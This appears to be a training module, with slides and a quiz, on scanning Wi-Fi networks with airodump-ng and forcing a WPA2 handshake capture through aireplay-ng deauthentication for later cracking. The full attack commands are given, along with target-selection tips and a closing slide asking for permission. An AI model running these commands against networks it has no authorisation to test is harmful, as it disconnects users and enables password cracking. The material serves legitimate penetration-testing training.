title: Discovering & Targeting Wi-Fi Networks 🎯
description: Use airodump-ng to scan for networks and select vulnerable targets.

slides.title: airodump-ng: Your Wireless Eyes 👀
slides.content:
# Sniffing the Airwaves

`airodump-ng` is the primary tool for capturing raw 802.11 frames and displaying discovered networks and clients.

**Basic Scan:**
```bash
sudo airodump-ng wlan0mon
```

**What You See:**
| Column | Meaning |
| :--- | :--- |
| **BSSID** | MAC address of the AP. |
| **PWR** | Signal strength (higher negative number = weaker). |
| **Beacons** | Number of beacon frames sent. |
| **#Data** | Number of data packets captured. |
| **CH** | Channel number. |
| **ENC** | Encryption: OPN (Open), WEP, WPA, WPA2, WPA3. |
| **AUTH** | Authentication: PSK (password), MGT (Enterprise). |
| **ESSID** | Network name. |

**Target Selection**: Look for networks with **ENC: WPA2**, **AUTH: PSK**, and a **strong signal (PWR > -60)** .

quizData.question: You see a network with BSSID `00:11:22:33:44:55`, ENC `WPA2`, AUTH `PSK`, and ESSID `HomeWiFi`. What type of network is this?

options.text: An open network with no password.
A WPA2-Personal network using a Pre-Shared Key (password).
A WPA2-Enterprise network using a RADIUS server.

quizData.explanation: AUTH: PSK indicates a standard home/small business password-protected network.

slides.title: Targeted Capture: Focusing on One Network 🎯
slides.content:
# Saving Data for Cracking

To capture the 4-Way Handshake, you need to focus on a **specific AP** and **save the data to a file**.

**Command:**
```bash
sudo airodump-ng -c [channel] --bssid [BSSID] -w [output_filename] wlan0mon
```

**Example:**
```bash
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon
```
- `-c 6` : Locks the card to channel 6 (prevents channel hopping).
- `--bssid` : Only captures traffic for this specific AP.
- `-w capture` : Saves packets to `capture-01.cap`.

**Now wait.** The bottom section of `airodump-ng` shows **connected clients** (STATION). You need a client to connect (or reconnect) to capture the handshake.

slides.title: The Waiting Game... or Force It 🕒
slides.content:
# How to Get the Handshake

**Option 1: Wait Patiently**
A new client will eventually connect, or an existing client will re-authenticate. This could take **hours**.

**Option 2: Deauthentication Attack (Force It)**
Send a **deauthentication frame** to a connected client, kicking them off the network. When their device automatically reconnects, you capture the handshake!

**Command:**
```bash
sudo aireplay-ng -0 [count] -a [BSSID] -c [Client_MAC] wlan0mon
```

- `-0 5` : Send 5 deauth packets.
- `-a` : BSSID of the AP.
- `-c` : MAC address of the connected client (from airodump-ng bottom panel).

**Example:**
```bash
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon
```

**Result**: In the `airodump-ng` window, you'll see `WPA handshake: 00:11:22:33:44:55` appear in the top right. **Success!**

slides.title: Complete Handshake Capture Workflow 💻
slides.content: Step-by-step commands for capturing a WPA2 handshake.
slides.codeSnippet:
# Terminal 1: Start targeted capture
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Terminal 2: Send deauth packets (wait until client appears in Terminal 1)
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c AA:BB:CC:DD:EE:FF wlan0mon

# Check Terminal 1 for "WPA handshake" confirmation.
# Press Ctrl+C to stop capture. File is capture-01.cap.

slides.title: Deauth Attacks Are Noisy 📢
slides.content:
## You Will Cause a Disruption

Sending deauthentication packets **will disconnect the user** from the internet. They will experience a brief drop. In a real penetration test, get **explicit permission** for active deauth attacks. For lab practice, use a **test device you own** (e.g., an old phone connected to your lab router).
